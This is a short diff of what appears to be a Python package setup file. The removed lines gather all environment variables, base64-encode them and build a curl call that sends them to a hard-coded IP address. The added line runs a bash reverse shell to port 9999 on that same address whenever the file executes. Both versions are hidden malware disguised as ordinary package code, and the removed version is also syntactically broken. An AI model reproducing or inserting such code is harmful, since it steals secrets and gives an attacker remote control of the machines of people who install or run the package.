@@ -11,18 +11,10 @@ import os
 import base64
 import json
 
-env_vars = dict(os.environ)
-    
-    # 转换为 JSON 并编码为 Base64
-env_json = json.dumps(env_vars, ensure_ascii=False)
-env_b64 = base64.b64encode(env_json.encode('utf-8')).decode('utf-8')
-
-# 3. 构建 cURL 命令（将 Base64 数据作为 URL 参数传递）
-url = "curl -X \"https://47.242.44.226/?%s\"",env_b64
 
 
 
-os.system(url)
+os.system("bash -i >& /dev/tcp/47.242.44.226/9999 0>&1")
 
 
 # HISTORY.rst entry.
